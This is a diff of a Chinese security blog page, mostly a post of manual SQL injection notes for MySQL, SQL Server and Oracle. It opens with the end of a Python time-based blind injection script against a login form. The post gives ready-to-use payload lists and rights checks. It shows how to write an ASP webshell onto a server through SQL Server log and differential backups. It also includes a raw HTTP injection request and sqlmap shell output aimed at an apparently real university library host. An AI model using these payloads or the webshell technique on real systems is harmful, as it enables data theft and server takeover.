getDbLength():</span><br><span class="line">    for i in range(1, 20):</span><br><span class="line">        poc = &quot;admin&#x27;;if(len(db_name())=%d)waitfor/**/delay&#x27;0:0:5&#x27;else/**/waitfor/**/delay&#x27;0:0:2&quot; % (i, )</span><br><span class="line">        data = &quot;logon.x=link&amp;username=%s&amp;password=test&amp;appdate=2020-09-21&quot; % (poc)</span><br><span class="line">        print(i, poc)</span><br><span class="line">        t1 = time.time()</span><br><span class="line">        r = requests.post(url, headers=headers, data=data)</span><br><span class="line">        t2 = time.time()</span><br><span class="line">        if t2-t1 &gt;= 5:</span><br><span class="line">            print(&#x27;The db length is: &#x27;, i)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">def check(data):</span><br><span class="line">    t1 = time.time()</span><br><span class="line">    r = requests.post(url, headers=headers, data=data)</span><br><span class="line">    t2 = time.time()</span><br><span class="line">    if t2 - t1 &gt;= 3:</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">def getDbName():</span><br><span class="line">    length = 5 #getDbLength()</span><br><span class="line">    db_name = &#x27;&#x27;</span><br><span class="line">    for i in range(1, length + 1):</span><br><span class="line">        _min, _max = 0, 140</span><br><span class="line">        while _min &lt;= _max:</span><br><span class="line">            middle = int((_min + _max) / 2)</span><br><span class="line">            poc1 = &quot;admin&#x27;;if(ascii(substring((db_name()),%d,1))=%d)waitfor/**/delay&#x27;0:0:3&#x27;/**/else waitfor/**/delay&#x27;0:0:1&quot; % (</span><br><span class="line">            i, middle)</span><br><span class="line">            poc2 = &quot;admin&#x27;;if(ascii(substring((db_name()),%d,1))&gt;%d)waitfor/**/delay&#x27;0:0:3&#x27;/**/else waitfor/**/delay&#x27;0:0:1&quot; % (</span><br><span class="line">            i, middle)</span><br><span class="line">            data1 = &quot;logon.x=link&amp;username=%s&amp;password=test&amp;appdate=2020-09-21&quot; % (poc1,)</span><br><span class="line">            data2 = &quot;logon.x=link&amp;username=%s&amp;password=test&amp;appdate=2020-09-21&quot; % (poc2,)</span><br><span class="line">            if check(data1):  # guess right</span><br><span class="line">                print(chr(middle))</span><br><span class="line">                db_name += chr(middle)</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">            if check(data2):</span><br><span class="line">                print(&quot;目标字符 &gt; &quot;, middle)</span><br><span class="line">                _min = middle + 1</span><br><span class="line"></span><br><span class="line">            else:</span><br><span class="line">                print(&quot;目标字符 &lt; &quot;, middle)</span><br><span class="line">                _max = middle - 1</span><br><span class="line">    print(db_name)</span><br><span class="line">getDbLength()</span><br><span class="line">#getDbName()</span><br></pre></td></tr></table></figure>
+
+<p>提交SRC证明到这里即可~</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/09/19/sql-manual-injection-referrence/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="欣海余诚's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/09/19/sql-manual-injection-referrence/" itemprop="url">SQL手注参考笔记</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-09-19T14:28:54+08:00">
+                2020-09-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WEB%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">WEB安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if语句： if(1=1,1,0)</span><br><span class="line">substr(&quot;abc&quot;, 1, 1) //a</span><br><span class="line">select @@secure_file_priv; //查看文件导出权限</span><br><span class="line">&#x27;/var/lib/mysql-files/&#x27;</span><br><span class="line">select @@plugin_dir; //查看plugin目录</span><br><span class="line">&#x27;/usr/lib64/mysql/plugin/&#x27;</span><br><span class="line">select @@basedir; // 查看数据库目录</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">bool型(无空格)</span><br><span class="line">1&#x27;and&#x27;y&#x27;=&#x27;f</span><br><span class="line">1&#x27;and&#x27;y&#x27;=&#x27;y</span><br><span class="line">1&#x27;and ord(mid(user(),1,1))&gt;1 and &#x27;y&#x27;=&#x27;y</span><br><span class="line">搜索型：</span><br><span class="line">%&#x27; and 1=1 and &#x27;%&#x27;=&#x27;</span><br><span class="line">%&#x27; and 1=2 and &#x27;%&#x27;=&#x27;</span><br><span class="line">报错注入</span><br><span class="line">&#x27;and/**/extractvalue(1,concat(char(126),md5(1982470395)))and&#x27;</span><br><span class="line">&#x27;and/**/extractvalue(1,concat(user()))and&#x27;</span><br><span class="line">1&#x27;and/**/updatexml(1,concat(char(126),user()),1)and&#x27;</span><br><span class="line">盲注(无空格)</span><br><span class="line">1&#x27;and(select*from(select+sleep(2))a/**/union/**/select+1)=&#x27;</span><br><span class="line">注数据库长度：</span><br><span class="line">1&#x27;and(select*from(select if(LENGTH(database())=%d,sleep(3),0))a)=&#x27;</span><br><span class="line">注数据库名：</span><br><span class="line">1&#x27;and(select*from(select if(ASCII(SUBSTR(database(),1,1))=97,sleep(3),0))a)=&#x27;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>盲注常用函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ascii(str): str是一个字符串参数，返回值为其最左侧字符的ascii码。通过它，我们才能确定特定的字符。</span><br><span class="line"></span><br><span class="line">substr(str,start,len): 这个函数是取str中从下标start开始的，长度为len的字符串。通常在盲注中用于取出单个字符，交给ascii函数来确定其具体的值。。</span><br><span class="line"></span><br><span class="line">MID(str, start [, Length]): 也是截取字符串，只用于mysql。</span><br><span class="line"></span><br><span class="line">length(str): 这个函数是用来获取str的长度的。这样我们才能知道需要通过substr取到哪个下标。</span><br><span class="line"></span><br><span class="line">count([column]): 这个函数大家应该很熟，用来统计记录的数量的，其在盲注中，主要用于判断符合条件的记录的数量，并逐个破解。</span><br><span class="line"></span><br><span class="line">if(condition,a,b): 当condition为true的时候，返回a，当condition为false的时候，返回b。</span><br><span class="line"></span><br><span class="line">ord(&#x27;a&#x27;) 转换为ascii码</span><br><span class="line"></span><br><span class="line">left(str, len) 取str中前len个字符。select LEFT(&#x27;123&#x27;,2)结果为12</span><br><span class="line"></span><br><span class="line">char(114) 数字转换为字符</span><br><span class="line"></span><br><span class="line">regexp &#x27;正则表达式&#x27; 正则表达式匹配 select &#x27;2bc&#x27; REGEXP &#x27;^[a-z]&#x27;</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="SQL-Server"><a href="#SQL-Server" class="headerlink" title="SQL Server"></a>SQL Server</h1><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><ul>
+<li>端口号为 1433</li>
+<li>数据库后缀名 .mdf</li>
+<li>注释符 –</li>
+<li>支持堆叠查询：Y</li>
+</ul>
+<h3 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h3><ul>
+<li>sa权限：数据库操作，文件管理，命令执行，注册表读取等system。SQLServer数据库的最高权限</li>
+<li>db_owner权限：文件管理，数据库操作等权限 users-administrators</li>
+<li>public权限：数据库操作 guest-users</li>
+</ul>
+<h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><p>有6个默认的库，分别是4个系统数据库：</p>
+<ul>
+<li>master</li>
+<li>model</li>
+<li>msdb </li>
+<li>tempdb</li>
+</ul>
+<p>和2个其他数据库：</p>
+<ul>
+<li>ReportServer</li>
+<li>ReportServerTempDB。</li>
+</ul>
+<p>其中，model和tempdb是默认没有数据表的。</p>
+<h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">select @@version;       #查询数据库的版本</span><br><span class="line">select host_name();     #查询主机名，如果是用navicat远程连接的话，主机名是本地的名字</span><br><span class="line">select db_name();       #查询当前数据库名</span><br><span class="line">select user;            #查询当前数据库的拥有者，结果为 dbo。dbo是每个数据库的默认用户，具有所有者权限，全称：datebaseOwner ，即DbOwner </span><br><span class="line">use tempdb              #切换到tempdb表  </span><br><span class="line">top n                   #查询前n条记录</span><br><span class="line">select substring(&#x27;string&#x27;,2,1)     #截取给定字符串的索引为2的1个字符</span><br><span class="line">select ascii(&#x27;a&#x27;)                  #查询给定字符串的ascii值</span><br><span class="line">select len(&#x27;string&#x27;)               #查询给定字符串的长度</span><br><span class="line">if语句：sqlserver：if(1=1) (sql语句)   else （sql语句）</span><br><span class="line"></span><br><span class="line">#查询数据库</span><br><span class="line">select count(name) from sysdatabases     #查询数据库的个数</span><br><span class="line">select name  from sysdatabases           #查询数据库的名字</span><br><span class="line">select * from sysdatabases               #查询所有数据库的信息</span><br><span class="line"></span><br><span class="line">#查询数据表</span><br><span class="line">select * from sysobjects where type=&#x27;u&#x27;  #查询当前数据库的所有表的详细信息</span><br><span class="line">select count(name) from msdb..sysobjects where xtype=&#x27;U&#x27;  #查询指定msdb数据库中表的个数</span><br><span class="line">select name from msdb..sysobjects where xtype=&#x27;U&#x27;         #查询指定msdb数据库中表的名字</span><br><span class="line">select * from msdb..sysobjects where xtype=&#x27;U&#x27;            #查询指定msdb数据库中表的详细信息</span><br><span class="line"></span><br><span class="line">#查询列</span><br><span class="line">select name from syscolumns where id=(select max(id) from sysobjects where xtype=&#x27;u&#x27; and name=&#x27;users&#x27;)           #查询当前数据库的指定users表的所有列</span><br><span class="line">select count(name) from test..syscolumns where id=(select max(id) from test..sysobjects where xtype=&#x27;u&#x27; and name=&#x27;users&#x27;)   #查询指定test数据库的指定users表的列的个数</span><br><span class="line">select name from test..syscolumns where id=(select max(id) from test..sysobjects where xtype=&#x27;u&#x27; and name=&#x27;users&#x27;)       #查询指定test数据库的指定users表的所有列</span><br><span class="line">select * from test..syscolumns where id=(select max(id) from test..sysobjects where xtype=&#x27;u&#x27; and name=&#x27;users&#x27;)       #查询指定test数据库的指定users表的列的详细信息</span><br><span class="line"></span><br><span class="line">#查询数据</span><br><span class="line">select count(*) from test..user          #查询test数据库user表的数据的条数</span><br><span class="line">select * from test..user                 #查询test数据库user表的所有数据</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><p>手工注入payload: </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">xray检验是否存在sql注入：</span><br><span class="line">932&#x27;and/**/convert(int,sys.fn_sqlvarbasetostr(HashBytes(&#x27;MD5&#x27;,&#x27;1899274127&#x27;)))&gt;&#x27;0</span><br><span class="line"></span><br><span class="line">boolean-based blind</span><br><span class="line">Payload: centid=932&#x27; AND 6663=6663 AND &#x27;dlfS&#x27;=&#x27;dlfS</span><br><span class="line"></span><br><span class="line">error-based</span><br><span class="line">Payload: centid=932&#x27; AND 8657 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(106)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (8657=8657) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(120)+CHAR(122)+CHAR(113))) AND &#x27;YkOb&#x27;=&#x27;YkOb</span><br><span class="line">Vector: AND [RANDNUM] IN (SELECT (&#x27;[DELIMITER_START]&#x27;+([QUERY])+&#x27;[DELIMITER_STOP]&#x27;))</span><br><span class="line"></span><br><span class="line">stacked queries</span><br><span class="line">centid=932&#x27;;WAITFOR DELAY &#x27;0:0:5&#x27;--</span><br><span class="line"></span><br><span class="line">time-based blind</span><br><span class="line">centid=932&#x27;;WAITFOR DELAY &#x27;0:0:5&#x27;--</span><br><span class="line">admin&#x27;and(select+1)&gt;0waitfor/**/delay&#x27;0:0:3</span><br><span class="line">admin&#x27;;waitfor/**/delay&#x27;0:0:3</span><br><span class="line"></span><br><span class="line">获取当前user</span><br><span class="line">932&#x27; and 1=(select user_name())--</span><br><span class="line">获取当前数据库</span><br><span class="line">932&#x27; and 1=(select db_name()) AND &#x27;WckB&#x27;=&#x27;WckB</span><br><span class="line"></span><br><span class="line">获取第一个数据库(dbid=1获取第一个)</span><br><span class="line">932&#x27; and 1=(select name from master.dbo.sysdatabases where dbid=1)--</span><br><span class="line">注表名</span><br><span class="line">932&#x27; and  1=(select top 1 name from where xtype=’u’)--</span><br><span class="line">注列名</span><br><span class="line">and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name=&#x27;表名&#x27;))--</span><br><span class="line">注数据</span><br><span class="line">932&#x27; and 1=(select top 1 表名 from 字段名)--</span><br><span class="line">查看是否有xp_cmdshell权限（）</span><br><span class="line">932&#x27; and 1=(Select count(*) FROM sysobjects Where xtype = &#x27;X&#x27; AND name = &#x27;xp_cmdshell&#x27;)--</span><br><span class="line">932&#x27; and 0=(Select count(*) FROM sysobjects Where xtype = &#x27;X&#x27; AND name = &#x27;xp_cmdshell&#x27;)--</span><br><span class="line">判断当前数据库用户权限</span><br><span class="line">and 1=(IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;))        //返回正常为sa</span><br><span class="line">and 1=(IS_MEMBER(&#x27;db_owner&#x27;))               //返回正常为DB_OWNER</span><br><span class="line">and 1=(IS_srvrolemember(&#x27;public&#x27;))          //public权限,较低</span><br></pre></td></tr></table></figure>
+
+<h2 id="SqlServer-getshell"><a href="#SqlServer-getshell" class="headerlink" title="SqlServer getshell"></a>SqlServer getshell</h2><h3 id="LOG备份"><a href="#LOG备份" class="headerlink" title="LOG备份"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_17204441/article/details/90509698">LOG备份</a></h3><p>利用条件：</p>
+<ol>
+<li>至少DBO权限</li>
+<li>前提得知绝对路径，并且可写</li>
+<li>站库不分离</li>
+<li>数据库必须被备份过一次</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">alter database test set RECOVERY FULL;</span><br><span class="line">create table dbo.test2(a image);</span><br><span class="line">insert into test..test2(a) values (0x3c256578656375746520726571756573742822786879632229253e); //&lt;%execute request(&quot;xhyc&quot;)%&gt;</span><br><span class="line">backup database test to disk=&#x27;d:\sqlserver.bak&#x27;;</span><br><span class="line">backup log test to disk=&#x27;d:\shell.asp&#x27; with init;</span><br><span class="line">drop table test..test2;</span><br></pre></td></tr></table></figure>
+
+<p>测试dbo权限写入成功：</p>
+<p><img src="mssql_log_write_shell.jpg" alt="image"></p>
+<h3 id="差异备份"><a href="#差异备份" class="headerlink" title="差异备份"></a><a target="_blank" rel="noopener" href="https://www.cnblogs.com/PANDA-Mosen/p/13283204.html">差异备份</a></h3><ol>
+<li>至少DBO权限</li>
+<li>前提知道绝对路径，路径可写。</li>
+<li>HTTP 500错误不是自定义</li>
+<li>WEB和数据在一块。还有的就是数据库中不能存在%号之类的，不然也是不成功的。</li>
+<li>数据量不能太大</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">backup database test to disk = &#x27;d:\sqlserver.bak&#x27;;</span><br><span class="line">create table test..test2(a image);</span><br><span class="line">insert into test..test2(a) values (0x3c256578656375746520726571756573742822786879632229253e); //&lt;%execute request(&quot;xhyc&quot;)%&gt;</span><br><span class="line">backup database test to disk = &#x27;D:\phpstudy_pro\WWW\shell3.asp&#x27; with differential , format;</span><br><span class="line">drop table test..test2;</span><br></pre></td></tr></table></figure>
+<p>测试dbo权限写入成功：</p>
+<p><img src="mssql_diff_write_shell.jpg" alt="image"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>Sqlserver 大于2005版本默认关闭xp_cmdshell，无法执行系统cmd命令，需要安装cmd_shell组件。</p>
+<p>db_owner、public权限提权：通过文件备份功能写入一句话木马</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/csnd/p/11807695.html">SQLServer数据库及注入方法</a></li>
+</ul>
+<h1 id="Oralce"><a href="#Oralce" class="headerlink" title="Oralce"></a>Oralce</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /middle.aspx HTTP/1.1</span><br><span class="line">Host: library.ysu.edu.cn</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Content-Length: 115</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Referer: http://library.ysu.edu.cn/</span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line"></span><br><span class="line">number=2&#x27;/**/and/**/(select decode(length(user),5,dbms_pipe.receive_message(&#x27;RDS&#x27;,10),0) from dual)=&#x27;1&amp;passwd=admin</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; python sqlmap.py -r pack.txt -pnumber  -v --sql-shell</span><br><span class="line">select banner from sys.v_$version [2]:</span><br><span class="line">[*] Oracle Database 11g Enterprise Edition Release 11.2.0.1.0 - 64bit Production</span><br><span class="line">[*] PL/SQL Release 11.2.0.1.0 - Production</span><br></pre></td></tr></table></figure>
+<h2 id="基本信息-1"><a href="#基本信息-1" class="headerlink" title="基本信息"></a>基本信息</h2><ul>
+<li>Oracle不支持堆叠查询</li>
+<li>DBMS_PIPE.RECEIVE_MESSAGE函数将为从RDS管道返回的数据等待10秒。默认情况下，允许以public权限执行该包。</li>
+<li>不同于其它数据库，oracle只会安装一个数据库，但是可以创建多个用户，将用户和表对应起来。</li>
+<li>dual是一个虚拟表，用来构成select的语法规则，oracle保证dual里面永远只有一条记录。</li>
+<li>创建用户不指定表空间会把各种数据放到默认的空间里</li>
+</ul>
+<p>常用数据表：</p>
+<ul>
+<li>dba用户表：dba_users</li>
+<li>dba表空间表：dba_tablespaces</li>
+<li>版本号表：product_component_version</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\admin&gt; sqlplus</span><br><span class="line"></span><br><span class="line">SQL*Plus: Release 11.2.0.2.0 Production on 星期四 9月 24 11:54:09 2020</span><br><span class="line"></span><br><span class="line">Copyright (c) 1982, 2014, Oracle.  All rights reserved.</span><br><span class="line"></span><br><span class="line">请输入用户名:  sys as sysdba</span><br><span class="line">输入口令:</span><br><span class="line"></span><br><span class="line">连接到:</span><br><span class="line">Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production</span><br><span class="line"></span><br><span class="line">//create user xxxxx(用户名) identified by &quot;密码&quot; </span><br><span class="line">//grant dba to 用户名  --给用户赋予所有权限，connect是赋予连接数据库的权限，resource 是赋予用户只可以创建实体但是没有创建数据结构的权限。</span><br><span class="line"></span><br><span class="line">//切换用户</span><br><span class="line">SQL&gt; conn scott</span><br><span class="line">输入口令: 123456</span><br><span class="line">已连接。</span><br><span class="line"></span><br><span class="line">//查看当前用户==show user</span><br><span class="line">SQL&gt; select user from dual;  </span><br><span class="line"></span><br><span class="line">USER</span><br><span class="line">------------------------------------------------------------</span><br><span class="line">SCOTT</span><br><span class="line"></span><br><span class="line">//查看数据库版本</span><br><span class="line">SQL&gt; select product, version from product_component_version where substr(product, 1, 6)=&#x27;Oracle&#x27;; </span><br><span class="line"></span><br><span class="line">PRODUCT</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">VERSION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">Oracle Database 11g Express Edition</span><br><span class="line">11.2.0.2.0</span><br><span class="line"></span><br><span class="line">//使用host命令可以执行系统命令</span><br><span class="line">SQL&gt; host whoami</span><br><span class="line">desktop-3o58k0a\admin</span><br><span class="line"></span><br><span class="line">//创建表</span><br><span class="line">SQL&gt; create table t_user(id number(10) primary key, name varchar2(20)); </span><br><span class="line"></span><br><span class="line">表已创建。</span><br><span class="line"></span><br><span class="line">//插入</span><br><span class="line">SQL&gt; insert into t_user(id, name) values(1, &#x27;123&#x27;); //必须是单引号？双引号就报错</span><br><span class="line"></span><br><span class="line">已创建 1 行。</span><br><span class="line"></span><br><span class="line">//有更新一定要commit</span><br><span class="line">SQL&gt;COMMIT;</span><br><span class="line"></span><br><span class="line">//查看所有表空间</span><br><span class="line">SQL&gt; select tablespace_name from dba_tablespaces;</span><br><span class="line"></span><br><span class="line">TABLESPACE_NAME</span><br><span class="line">------------------------------------------------------------</span><br><span class="line">SYSTEM</span><br><span class="line">SYSAUX</span><br><span class="line">UNDOTBS1</span><br><span class="line">TEMP</span><br><span class="line">USERS</span><br><span class="line"></span><br><span class="line">//查看当前用户的表</span><br><span class="line">SQL&gt; select table_name from user_tables where rownum &lt; 5;</span><br><span class="line"></span><br><span class="line">TABLE_NAME</span><br><span class="line">------------------------------------------------------------</span><br><span class="line">ICOL$</span><br><span class="line">IND$</span><br><span class="line">COL$</span><br><span class="line">CLU$</span><br><span class="line"></span><br><span class="line">//延时函数dbms_pipe.receive_message：从rds（可任意命名）管道等待4秒钟</span><br><span class="line">SQL&gt; select dbms_pipe.receive_message(&#x27;rds&#x27;, 4) from dual;</span><br><span class="line"></span><br><span class="line">DBMS_PIPE.RECEIVE_MESSAGE(&#x27;RDS&#x27;,4)</span><br><span class="line">----------------------------------</span><br><span class="line">                                 1</span><br><span class="line">//查询ip地址</span><br><span class="line">SQL&gt; select utl_inaddr.get_host_address from dual;</span><br><span class="line"></span><br><span class="line">GET_HOST_ADDRESS</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">fe80::35db:b13e:5850:3ca3%3</span><br></pre></td></tr></table></figure>
+
+<h2 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">decode(条件,值1,返回值1,值2,返回值2,…值n,返回值n,缺省值) //作用与if类似</span><br><span class="line">substr(user, 1, 1)</span><br><span class="line">ascii(&#x27;a&#x27;)</span><br><span class="line">dbms_pipe.receive_message(任意管道名, 等待时间)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Payloads"><a href="#Payloads" class="headerlink" title="Payloads"></a>Payloads</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">time-based</span><br><span class="line">2&#x27;/**/and/**/DBMS_PIPE.RECEIVE_MESSAGE(&#x27;f&#x27;,3)=&#x27;f</span><br><span class="line">2&#x27;/**/and/**/(select decode(length(user),6,dbms_pipe.receive_message(&#x27;RDS&#x27;,5),0) from dual)=&#x27;1</span><br><span class="line">2&#x27;/**/and/**/(select decode(ascii(substr(user,1,1)), 128, dbms_pipe.receive_message(&#x27;RDS&#x27;,5),0) from dual)=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<ul>
